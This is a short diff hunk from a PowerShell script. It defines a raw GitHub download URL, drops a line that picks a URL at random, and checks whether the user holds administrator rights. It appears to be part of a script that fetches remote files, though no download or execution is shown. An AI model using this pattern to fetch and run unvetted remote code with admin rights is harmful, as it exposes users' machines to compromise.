@@ -7,7 +7,6 @@ $DownloadURL1 = 'https://raw.githubusercontent.com/BL4ckCloud/abahzian/main/'
 
 
 $URLs = @($DownloadURL1)
-$RandomURL1 = Get-Random -InputObject $URLs
 
 $rand = Get-Random -Maximum 99999999
 $isAdmin = [bool]([Security.Principal.WindowsIdentity]::GetCurrent().Groups -match 'S-1-5-32-544')
